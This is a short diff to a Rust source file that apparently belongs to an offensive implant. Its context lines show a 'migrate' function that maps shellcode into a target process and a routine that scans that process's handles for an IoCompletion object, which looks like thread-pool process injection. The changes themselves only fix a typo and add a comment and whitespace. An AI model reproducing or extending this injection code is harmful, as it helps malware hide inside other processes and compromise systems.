@@ -58,7 +58,7 @@ unsafe fn try_post_io_completion(target_process: HANDLE, tp_direct_addr: *mut c_
     let mut tried_count: usize = 0;
     let mut posted = false;
 
-    debug!("[POOL] Process has {} handles, scannong for IoCompletion", handles_count);
+    debug!("[POOL] Process has {} handles, scanning for IoCompletion", handles_count);
 
     for i in 0..handles_count {
         let entry = &*handles_array.add(i);
@@ -126,6 +126,7 @@ unsafe fn free_virtual_memory(mut buffer: *mut c_void) { unsafe {
         0,
     );
 }}
+
 
 pub unsafe fn migrate(shellcode: &[u8], process_handle: HANDLE, target_pid: usize) -> bool { unsafe {
     if shellcode.is_empty() || process_handle.is_null() || target_pid == 0 {
@@ -211,6 +212,8 @@ pub unsafe fn migrate(shellcode: &[u8], process_handle: HANDLE, target_pid: usiz
     }
 
     debug!("[POOL] Shellcode mapped: local wrote {}B -> Remote RX@{:p} ({}B view)", shellcode.len(), remote_shellcode, remote_view_size);
+
+    // TP structs via shared section
 
     let callbacks_size: usize = 16; // 2 pointers: Executecallbacks + Unposted
     let tp_direct_size = core::mem::size_of::<TpDirect>();
